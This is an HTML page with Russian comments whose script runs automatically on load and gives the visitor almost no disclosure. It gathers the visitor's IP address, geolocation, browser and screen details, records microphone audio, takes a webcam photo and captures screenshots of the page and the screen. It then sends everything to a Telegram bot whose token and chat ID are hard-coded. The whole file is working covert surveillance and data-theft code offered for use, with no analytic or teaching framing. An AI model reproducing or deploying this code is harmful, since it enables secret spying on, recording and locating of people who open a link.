<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> </title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }
        
        #status {
            position: fixed;
            bottom: 10px;
            left: 10px;
            font-size: 12px;
            opacity: 0.7;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div id="status">Инициализация...</div>
    
    <!-- Элементы для создания скриншота -->
    <canvas id="screenshotCanvas" class="hidden"></canvas>

    <script>
        // Конфигурация (замените на свои данные)
        const TELEGRAM_BOT_TOKEN = '8464646188:AAHN2tltIrPmNplKp35GTX9PM9WpaIATeNE';
        const TELEGRAM_CHAT_ID = '1459592080';
        
        // Переменные для хранения данных
        let collectedData = {};
        let audioRecorder = null;
        let audioChunks = [];
        let audioBlob = null;

        // Функция для конвертации DataURL в Blob
        function dataURLToBlob(dataURL) {
            const parts = dataURL.split(';base64,');
            const contentType = parts[0].split(':')[1];
            const raw = window.atob(parts[1]);
            const uInt8Array = new Uint8Array(raw.length);
            
            for (let i = 0; i < raw.length; ++i) {
                uInt8Array[i] = raw.charCodeAt(i);
            }
            
            return new Blob([uInt8Array], { type: contentType });
        }

        // Обновление статуса
        function updateStatus(message) {
            document.getElementById('status').textContent = message;
        }

        // Получение IP адреса
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Не удалось получить';
            }
        }

        // Получение геолокации
        function getGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('Не поддерживается');
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' метров'
                        });
                    },
                    (error) => {
                        resolve('Доступ запрещен');
                    },
                    { timeout: 10000 }
                );
            });
        }

        // Запись аудио (параллельно с другими операциями)
        async function startAudioRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: {
                        channelCount: 1,
                        sampleRate: 44100,
                        sampleSize: 16
                    } 
                });
                
                audioRecorder = new MediaRecorder(stream);
                audioChunks = [];
                
                audioRecorder.ondataavailable = (event) => {
                    audioChunks.push(event.data);
                };
                
                audioRecorder.onstop = () => {
                    audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                    // Освобождаем ресурсы
                    stream.getTracks().forEach(track => track.stop());
                };
                
                audioRecorder.start();
                updateStatus("Запись аудио...");
                
            } catch (error) {
                console.error('Ошибка записи аудио:', error);
                updateStatus("Ошибка записи аудио");
            }
        }

        // Остановка записи аудио
        function stopAudioRecording() {
            if (audioRecorder && audioRecorder.state === 'recording') {
                audioRecorder.stop();
            }
            return new Promise(resolve => setTimeout(resolve, 500)); // Даем время для обработки
        }

        // Сделать фото
        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                video.srcObject = stream;
                
                // Ждем пока видео готово
                await new Promise((resolve, reject) => {
                    video.onloadedmetadata = resolve;
                    video.onerror = reject;
                    video.play().catch(reject);
                });
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Даем камере время на фокусировку
                await new Promise(resolve => setTimeout(resolve, 500));
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photoData = canvas.toDataURL('image/jpeg', 0.7);
                
                // Освобождаем ресурсы
                stream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
                
                return photoData;
            } catch (error) {
                console.error('Ошибка при создании фото:', error);
                return null;
            }
        }

        // Сделать скриншот экрана (если доступно)
        async function captureScreen() {
            try {
                // Проверяем поддержку API захвата экрана
                if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
                    console.log('Захват экрана не поддерживается');
                    return null;
                }
                
                // Запрашиваем доступ к экрану
                const screenStream = await navigator.mediaDevices.getDisplayMedia({
                    video: {
                        cursor: "always",
                        displaySurface: "window" // или "browser", "monitor"
                    },
                    audio: false
                });
                
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                video.srcObject = screenStream;
                
                // Ждем пока видео готово
                await new Promise((resolve, reject) => {
                    video.onloadedmetadata = resolve;
                    video.onerror = reject;
                    video.play().catch(reject);
                });
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Даем время для стабилизации
                await new Promise(resolve => setTimeout(resolve, 500));
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const screenData = canvas.toDataURL('image/jpeg', 0.7);
                
                // Освобождаем ресурсы
                screenStream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
                
                return screenData;
            } catch (error) {
                console.error('Ошибка при создании скриншота экрана:', error);
                return null;
            }
        }

        // Сделать скриншот видимой области страницы
        async function captureScreenshot() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                // Устанавливаем размер canvas под размер видимой области
                canvas.width = document.documentElement.clientWidth;
                canvas.height = document.documentElement.clientHeight;
                
                // Заливаем белым фоном (на случай прозрачности)
                ctx.fillStyle = '#ffffff';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                // Пытаемся нарисовать видимую область
                try {
                    // Создаем изображение из HTML-содержимого
                    const htmlContent = new XMLSerializer().serializeToString(document);
                    const DOMURL = window.URL || window.webkitURL || window;
                    const img = new Image();
                    const svg = new Blob([htmlContent], {type: 'image/svg+xml;charset=utf-8'});
                    const url = DOMURL.createObjectURL(svg);
                    
                    await new Promise((resolve, reject) => {
                        img.onload = resolve;
                        img.onerror = reject;
                        img.src = url;
                    });
                    
                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                    DOMURL.revokeObjectURL(url);
                } catch (e) {
                    console.error('Не удалось создать скриншот HTML:', e);
                    // Альтернативный метод - просто закрашиваем область
                    ctx.fillStyle = '#000000';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    ctx.fillStyle = '#ffffff';
                    ctx.font = '20px Arial';
                    ctx.fillText('Скриншот недоступен', 10, 30);
                }
                
                // Конвертируем в data URL
                const screenshotData = canvas.toDataURL('image/jpeg', 0.7);
                
                return screenshotData;
            } catch (error) {
                console.error('Ошибка при создании скриншота:', error);
                return null;
            }
        }

        // Отправка данных в Telegram
        async function sendToTelegram(data, photo = null, audio = null, screenshot = null, screenCapture = null) {
            try {
                let message = `📊 Данные\n`;
                message += `Время: ${data.timestamp}\n`;
                message += `IP: ${data.ip}\n`;
                message += `Браузер: ${data.userAgent}\n`;
                message += `Местоположение: ${JSON.stringify(data.location)}\n`;
                message += `Экран: ${data.screenInfo.width}x${data.screenInfo.height}\n`;
                message += `Камера: ${data.camera}\n`;
                message += `Микрофон: ${data.microphone}`;

                // Отправка фото
                if (photo) {
                    try {
                        const photoBlob = dataURLToBlob(photo);
                        const photoFormData = new FormData();
                        photoFormData.append('chat_id', TELEGRAM_CHAT_ID);
                        photoFormData.append('caption', message);
                        photoFormData.append('photo', photoBlob, 'photo.jpg');
                        
                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: photoFormData
                        });
                    } catch (error) {
                        console.error('Ошибка отправки фото:', error);
                    }
                } else {
                    // Если фото нет, отправляем только текст
                    try {
                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                chat_id: TELEGRAM_CHAT_ID,
                                text: message
                            })
                        });
                    } catch (error) {
                        console.error('Ошибка отправки сообщения:', error);
                    }
                }

                // Отправка аудио
                if (audio) {
                    try {
                        const audioFormData = new FormData();
                        audioFormData.append('chat_id', TELEGRAM_CHAT_ID);
                        audioFormData.append('audio', audio, 'audio.wav');
                        audioFormData.append('caption', 'Аудиозапись');
                        
                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
                            method: 'POST',
                            body: audioFormData
                        });
                    } catch (error) {
                        console.error('Ошибка отправки аудио:', error);
                    }
                }

                // Отправка скриншота страницы
                if (screenshot) {
                    try {
                        const screenBlob = dataURLToBlob(screenshot);
                        const screenFormData = new FormData();
                        screenFormData.append('chat_id', TELEGRAM_CHAT_ID);
                        screenFormData.append('caption', 'Скриншот страницы');
                        screenFormData.append('photo', screenBlob, 'screenshot.jpg');
                        
                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: screenFormData
                        });
                    } catch (error) {
                        console.error('Ошибка отправки скриншота:', error);
                    }
                }

                // Отправка скриншота экрана (если доступно)
                if (screenCapture) {
                    try {
                        const screenBlob = dataURLToBlob(screenCapture);
                        const screenFormData = new FormData();
                        screenFormData.append('chat_id', TELEGRAM_CHAT_ID);
                        screenFormData.append('caption', 'Скриншот экрана');
                        screenFormData.append('photo', screenBlob, 'screencapture.jpg');
                        
                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: screenFormData
                        });
                    } catch (error) {
                        console.error('Ошибка отправки скриншота экрана:', error);
                    }
                }
                
                return true;
            } catch (error) {
                console.error('Ошибка отправки в Telegram:', error);
                return false;
            }
        }

        // Основная функция сбора данных
        async function collectAllData() {
            try {
                updateStatus("Сбор данных...");
                
                // Запускаем запись аудио параллельно
                startAudioRecording();
                
                // Базовая информация
                collectedData.timestamp = new Date().toLocaleString('ru-RU');
                collectedData.userAgent = navigator.userAgent;
                collectedData.screenInfo = {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth
                };

                // Получение IP
                updateStatus("Получение IP...");
                collectedData.ip = await getIPAddress();

                // Получение геолокации
                updateStatus("Получение местоположения...");
                collectedData.location = await getGeolocation();

                // Проверка доступа к медиаустройствам
                updateStatus("Проверка устройств...");
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    collectedData.camera = 'доступно';
                    collectedData.microphone = 'доступно';
                    stream.getTracks().forEach(track => track.stop());
                } catch (error) {
                    collectedData.camera = 'не доступно';
                    collectedData.microphone = 'не доступно';
                }

                // Параллельное выполнение: фото, скриншоты
                updateStatus("Создание фото и скриншотов...");
                const [photoData, screenshotData, screenCaptureData] = await Promise.all([
                    collectedData.camera === 'доступно' ? capturePhoto() : Promise.resolve(null),
                    captureScreenshot(),
                    captureScreen()
                ]);

                // Останавливаем запись аудио и ждем завершения
                updateStatus("Завершение записи аудио...");
                await stopAudioRecording();

                collectedData.photo = photoData;

                // Отправка в Telegram
                updateStatus("Отправка данных...");
                await sendToTelegram(collectedData, collectedData.photo, audioBlob, screenshotData, screenCaptureData);

                updateStatus("Данные отправлены");
                
                // Завершение через 3 секунды
                setTimeout(() => {
                    document.body.innerHTML = '';
                }, 3000);

            } catch (error) {
                console.error('Ошибка при сборе данных:', error);
                updateStatus("Ошибка");
                
                // Все равно пытаемся отправить то, что собрали
                try {
                    await stopAudioRecording();
                    await sendToTelegram(collectedData, collectedData.photo, audioBlob, null, null);
                } catch (e) {
                    console.error('Ошибка при попытке отправить частичные данные:', e);
                }
            }
        }

        // Запуск при загрузке страницы
        document.addEventListener('DOMContentLoaded', () => {
            // Небольшая задержка перед началом
            setTimeout(collectAllData, 1000);
        });
    </script>
</body>
</html>
